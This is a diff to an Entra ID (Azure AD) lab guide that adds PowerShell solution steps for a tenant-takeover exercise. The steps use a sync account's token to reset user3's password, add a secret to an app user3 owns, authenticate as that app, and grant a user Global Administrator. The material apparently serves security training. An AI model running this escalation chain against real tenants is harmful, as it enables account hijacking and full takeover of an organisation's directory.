@@ -331,6 +331,7 @@ In this last exercise, your goal is to takeover the entire tenant, by getting th
 
 - Execute the following powershell from dcVm, and authenticate using your **Entra admin credentials**.
 - **DO NOT look into the script** as it will reveal the solution.
+- Change `YOURDOMAIN` 
 
 
     ```powershell 
@@ -349,11 +350,85 @@ In this last exercise, your goal is to takeover the entire tenant, by getting th
 **Once you're done, remove any role / permissions you've granted along the way.**
 
 There's an app named "My backup app"
-1. ```user3``` is an Owner of that app, which means he can add secrets to it
-1. authenticate as that user (after you've compromised it using the Sync__xx account)
-1. create a new secret for that app or its service principal
-1. use that secret to authenticate as that app
-1. the app has privileged permissions, use them to grant your user (or a new user) the global admin role
+1. ```user3``` is an Owner of that app, which means he can add secrets to it, here's how to enumerate and find it: 
+    ```powershell
+    Connect-AzureAD # use the Sync_xxx account
+
+    # Retrieve all applications
+    $applications = Get-AzureADApplication
+
+    # Iterate through applications and fetch their owners
+    foreach ($app in $applications) {
+        Write-Host "Application: $($app.DisplayName) - AppId: $($app.AppId)"
+        
+        # Get the application's owners
+        $owners = Get-AzureADApplicationOwner -ObjectId $app.ObjectId
+
+        if ($owners) {
+            foreach ($owner in $owners) {
+                Write-Host "  Owner: $($owner.DisplayName) ($($owner.UserPrincipalName), ImmutableId: $($owner.ImmutableId))"
+            }
+        } else {
+            Write-Host "  No owners found."
+        }
+        Write-Host "----------------------------"
+    }
+    ```
+1. authenticate as that user (after you've compromised it using the Sync__xx account):
+    ```powershell
+    $tenantId = "YOUR_TENANT_ID"
+    $at = Get-AADIntAccessTokenForAADGraph # use the Sync_xxx account
+    Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -AccessToken $at -Verbose 
+    ```
+1. create a new secret for that app or its service principal:
+    ```powershell
+    Connect-AzureAD # use user3 account with its newly password 
+
+    $appId = "<My Backup App's appId>"
+
+    # Get the application object using the AppId
+    $app = Get-AzureADApplication -Filter "AppId eq '$appId'"
+
+    # Define the start and end dates for the secret validity
+    $startDate = Get-Date
+    $endDate = $startDate.AddYears(1) # Secret valid for 1 year
+
+    # Create the new password secret
+    $passwordSecret = New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId -StartDate $startDate -EndDate $endDate
+
+    # Output the new secret value
+    $passwordSecret.Value
+    ```
+1. use that secret to authenticate as that app:
+    ```powershell
+    # Build the token request body
+    $Body = @{
+        grant_type    = "client_credentials"
+        client_id     = $appId
+        client_secret = $passwordSecret.Value
+        scope         = "https://graph.microsoft.com/.default"
+    }
+
+    # Get the token
+    $TokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
+        -Method POST `
+        -ContentType "application/x-www-form-urlencoded" `
+        -Body $Body
+
+    $at = $TokenResponse.access_token
+    $SecureAccessToken = ConvertTo-SecureString -String $at -AsPlainText -Force
+
+    # Connect to MSGraph using the token
+    Connect-MgGraph -AccessToken $SecureAccessToken
+    ```
+1. the app has privileged permissions, use them to grant your user (or a new user) the global admin role:
+    ```powershell
+    $UserPrincipalName = "<UserPrincipalName>"  # Replace with the user's UPN
+
+    $user = Get-MgUser -UserPrincipalName $userPrincipalName
+    $roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'"
+    New-MgRoleAssignment -PrincipalId $user.Id -RoleDefinitionId $roleDefinition.Id -DirectoryScopeId "/" # grant it with the GA role
+    ```
 </details>
 
 #
